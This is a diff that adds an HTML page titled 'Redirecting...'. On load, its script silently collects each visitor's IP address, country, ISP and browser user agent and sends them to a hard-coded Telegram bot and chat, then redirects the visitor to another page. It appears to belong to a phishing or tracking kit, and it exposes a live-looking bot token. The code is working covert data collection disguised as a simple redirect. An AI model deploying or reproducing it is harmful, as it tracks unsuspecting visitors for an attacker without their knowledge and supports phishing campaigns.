@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Redirecting...</title>
+    <script>
+      // Define your Telegram bot token and chat ID
+      const telegramBotToken = '7459076843:AAEehddqiZS0R3ep3ov1V_KtkHEWaLxY_zs';  // Replace with your bot token
+      const telegramChatId = '-4523917954';      // Replace with your group chat ID
+      const redirectUrl = './now.html'; // URL to redirect to
+
+      // Function to send the IP, country, ISP, and device info to Telegram
+      function sendInfoToTelegram(ip, country, isp, userAgent) {
+        const message = `New visitor Diuuusnnnnneyyy rrrr: ${ip}\n\nCountry: ${country}\n\nISP: ${isp}\n\nDevice: ${userAgent}`;
+        const telegramUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${telegramChatId}&text=${encodeURIComponent(message)}`;
+
+        // Send the info to Telegram using a GET request
+        fetch(telegramUrl)
+          .then(response => {
+            if (response.ok) {
+              console.log('Info sent to Telegram successfully.');
+            } else {
+              console.error('Failed to send info to Telegram.');
+            }
+          })
+          .catch(error => console.error('Error:', error));
+      }
+
+      // Function to get the user's IP and additional info using ipify and ipwhois
+      function getIpAndRedirect() {
+        // Fetch the public IP address from ipify
+        fetch('https://api.ipify.org?format=json')
+          .then(response => response.json())
+          .then(data => {
+            const ip = data.ip;
+            console.log(`IP Address: ${ip}`);
+
+            // Now fetch ISP, country, etc. using ipwhois service
+            fetch(`https://ipwhois.app/json/${ip}`)
+              .then(response => response.json())
+              .then(info => {
+                const country = info.country;
+                const isp = info.isp;
+                const userAgent = navigator.userAgent;  // Get the user agent for device info
+
+                console.log(`Country: ${country}, ISP: ${isp}, Device: ${userAgent}`);
+
+                // Send all the info to Telegram
+                sendInfoToTelegram(ip, country, isp, userAgent);
+
+                // Redirect the user after a short delay (2 seconds)
+                setTimeout(() => {
+                  window.location.href = redirectUrl;
+                }, 000); // Delay for 2 seconds to ensure data is sent before redirection
+              })
+              .catch(error => console.error('Error fetching ISP and country info:', error));
+          })
+          .catch(error => console.error('Error fetching IP:', error));
+      }
+
+      // Call the function when the page loads
+      window.onload = getIpAndRedirect;
+    </script>
+  </head>
+  <body>
+    <p></p>
+  </body>
+</html>
